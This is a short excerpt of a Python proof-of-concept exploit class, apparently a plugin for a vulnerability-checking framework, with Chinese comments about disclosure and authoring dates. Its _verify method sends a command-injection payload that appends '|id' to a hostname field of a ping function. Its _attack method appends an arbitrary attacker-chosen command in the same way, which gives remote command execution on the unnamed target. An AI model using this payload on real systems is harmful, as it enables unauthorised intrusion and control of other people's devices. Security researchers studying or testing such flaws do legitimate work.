...
class AIPOC(POCBase):
    ...
    vulDate = '2021-08-20' #漏洞公开的时间,不知道就写今天
    createDate = '2021-08-20'# 编写 PoC 的日期
    updateDate = '2021-08-20'# PoC 更新的时间,默认和编写时间一样
    ...
    def _verify(self):
        ...
        url = self.url + path
        #print(url)
        payload = "call_function=ping&iface=eth0&hostname=127.0.0.1|id"
        #print(payload)
        headers={
    ...
    def _attack(self):
        ...
        payload = "call_function=ping&iface=eth0&hostname=127.0.0.1|"+cmd+""
        #print(payload)
        headers={
           'Content-Type': 'application/x-www-form-urlencoded'
        }
